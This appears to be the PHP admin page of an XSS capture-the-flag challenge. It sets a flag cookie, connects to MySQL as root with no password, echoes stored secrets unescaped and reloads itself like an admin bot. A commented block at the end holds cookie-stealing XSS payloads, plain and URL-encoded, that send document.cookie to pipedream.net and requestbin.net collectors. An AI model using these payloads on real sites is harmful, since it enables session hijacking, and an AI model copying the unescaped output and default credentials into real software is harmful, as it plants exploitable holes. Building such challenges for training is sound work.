<?php
/*     MD5 of XSS is 2c71e977eccffb1cfb7c6cc22e0e7595.
	The name of the admin page is 2c71e977eccffb1cfb7c6cc22e0e7595-admin.php so that no one can bruteforceit.
	And only us can open it.
	*/

 /*
        CREATE TABLE users (id int NOT NULL AUTO_INCREMENT, name VARCHAR(255), pass VARCHAR(255), PRIMARY KEY(id)) ;
        CREATE TABLE locks (id int NOT NULL AUTO_INCREMENT, name VARCHAR(255), PRIMARY KEY(id)) ;
        CREATE TABLE notes (id int NOT NULL AUTO_INCREMENT, name VARCHAR(255), title VARCHAR(255), note VARCHAR(255), PRIMARY KEY(id)) ;
    */
/* Database credentials. Assuming you are running MySQL
server with default setting (user 'root' with no password) */
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'root');
define('DB_PASSWORD', '');
define('DB_NAME', 'xss');
 
/* Attempt to connect to MySQL database */
$link = new mysqli(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);
 //echo "jhi";
// Check connection
if($link === false){
    die("ERROR: Could not connect. " . mysqli_connect_error());
}

setcookie("ADMINSECRETCOOKIE", "gsc3:{0plmnko9_scripter}", time() + (86400 * 30), "/"); // 1 day
	
	//echo $id;
$sql = "SELECT id,secret FROM xss";
if ($result = $link->query($sql)) {
	//$rowCount = mysqli_num_rows($result);
	if ($result->num_rows > 0) {
						// output data of each row
		echo '<table>';
		echo '<tr>';
		echo '  <td>' . "id" . '</td>';
		echo '  <td>' . "secret" . '</td>';
		echo '  </tr> ';           
		while($row = $result->fetch_assoc())  {
			echo '<tr>';
			echo '  <td>' . $row["id"] . '</td>';
			echo '  <td>' . $row["secret"] . '</td>';
			echo '  </tr> ';                
		}
		echo'</table>';
	}
}

// $sql1 = "DELETE FROM xss WHERE id=0";
// if ($link->query($sql1) === TRUE) {
	// echo "Database has been flushed!!<br><br>";
//sleep(30);



	
$link->close();	
?>
<!--<form method="post" action="">
<input type="text" name="value">
<input type="submit">
</form>-->


<?php
$page = $_SERVER['PHP_SELF'];
$sec = "30";
?>
<html>
    <head>
    <meta http-equiv="refresh" content="<?php echo $sec?>;URL='<?php echo $page?>'">
    </head>
    <body>
    <?php echo "Watch the page reload itself in "; ?><?php echo $sec?><?php echo " second!"; ?>
	
    </body>
</html>





/* <?php
/* set_time_limit(0);
while (true)
{
URL encode:: <script>document.write("<img src='https://enh45yr3bd8of.x.pipedream.net/t1qfdot1?="+document.cookie+"'></img>");</script>
<script>document.write("<img src%3D'http%3A%2F%2Frequestbin.net%2Fr%2Ft1qfdot1%3F%3D"%2Bdocument.cookie%2B"'><%2Fimg>")%3B<%2Fscript>
%3Cscript%3Edocument.write%28%22%3Cimg%20src%3D%27https%3A%2F%2Fenh45yr3bd8of.x.pipedream.net%2Ft1qfdot1%3F%3D%22%2Bdocument.cookie%2B%22%27%3E%3C%2Fimg%3E%22%29%3B%3C%2Fscript%3E

$link->close();
} */
?>
 */